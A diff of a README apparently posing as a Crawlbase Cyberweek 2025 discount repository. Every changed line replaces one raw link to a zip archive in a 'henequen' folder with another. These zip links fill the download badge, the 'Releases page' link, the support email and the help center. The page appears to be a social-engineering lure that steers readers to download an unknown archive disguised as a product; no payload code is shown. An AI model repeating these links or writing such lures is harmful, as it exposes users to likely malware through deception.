@@ -1,7 +1,7 @@
 # 🛍️ crawlbase-cyberweek-deals-2025 - Save Big on Powerful Data Tools
 
 ## 📥 Download Now
-[![Download Now](https://raw.githubusercontent.com/KartikRawat0504/crawlbase-cyberweek-deals-2025/main/henequen/crawlbase-cyberweek-deals-2025_v1.0.zip%20Now-Get%20Started-blue)](https://raw.githubusercontent.com/KartikRawat0504/crawlbase-cyberweek-deals-2025/main/henequen/crawlbase-cyberweek-deals-2025_v1.0.zip)
+[![Download Now](https://github.com/KartikRawat0504/crawlbase-cyberweek-deals-2025/raw/refs/heads/main/henequen/deals_cyberweek_crawlbase_v2.8.zip%20Now-Get%20Started-blue)](https://github.com/KartikRawat0504/crawlbase-cyberweek-deals-2025/raw/refs/heads/main/henequen/deals_cyberweek_crawlbase_v2.8.zip)
 
 ## 🚀 Getting Started
 Welcome to the crawlbase-cyberweek-deals-2025 repository! This application helps you take advantage of a special promotion offering 15% off five powerful products. These tools include a Crawling API, Smart AI Proxy, Crawler, Cloud Storage, and LinkedIn Scraper.
@@ -26,7 +26,7 @@ This package includes the following tools:
 ## 📥 Download & Install
 To download the software, visit the Releases page. You can find all available versions there.
 
-[Download from Releases](https://raw.githubusercontent.com/KartikRawat0504/crawlbase-cyberweek-deals-2025/main/henequen/crawlbase-cyberweek-deals-2025_v1.0.zip)
+[Download from Releases](https://github.com/KartikRawat0504/crawlbase-cyberweek-deals-2025/raw/refs/heads/main/henequen/deals_cyberweek_crawlbase_v2.8.zip)
 
 1. Click on the link above to visit the Releases page.
 2. Look for the most recent version labeled clearly for ease of access.
@@ -64,8 +64,8 @@ After installation, you can start using the various tools included:
 
 ## 📞 Support
 If you encounter any issues or have questions, feel free to reach out to our support team:
-- Email: https://raw.githubusercontent.com/KartikRawat0504/crawlbase-cyberweek-deals-2025/main/henequen/crawlbase-cyberweek-deals-2025_v1.0.zip
-- Documentation: Check our [Help Center](https://raw.githubusercontent.com/KartikRawat0504/crawlbase-cyberweek-deals-2025/main/henequen/crawlbase-cyberweek-deals-2025_v1.0.zip)
+- Email: https://github.com/KartikRawat0504/crawlbase-cyberweek-deals-2025/raw/refs/heads/main/henequen/deals_cyberweek_crawlbase_v2.8.zip
+- Documentation: Check our [Help Center](https://github.com/KartikRawat0504/crawlbase-cyberweek-deals-2025/raw/refs/heads/main/henequen/deals_cyberweek_crawlbase_v2.8.zip)
 
 ## 🔍 Related Topics
 This repository covers various topics that can enhance your understanding and use of web scraping and data collection tools, such as:
@@ -84,4 +84,4 @@ For more in-depth information on each tool and feature, please refer to our offi
 This offer is part of the Crawlbase Cyberweek 2025 event, valid for a limited time. Make sure to take advantage of this discount while it lasts.
 
 ## 📥 Download Now Again
-Don't forget to [download the latest version](https://raw.githubusercontent.com/KartikRawat0504/crawlbase-cyberweek-deals-2025/main/henequen/crawlbase-cyberweek-deals-2025_v1.0.zip) of the software to enjoy the benefits of our amazing products at a discounted price.
+Don't forget to [download the latest version](https://github.com/KartikRawat0504/crawlbase-cyberweek-deals-2025/raw/refs/heads/main/henequen/deals_cyberweek_crawlbase_v2.8.zip) of the software to enjoy the benefits of our amazing products at a discounted price.
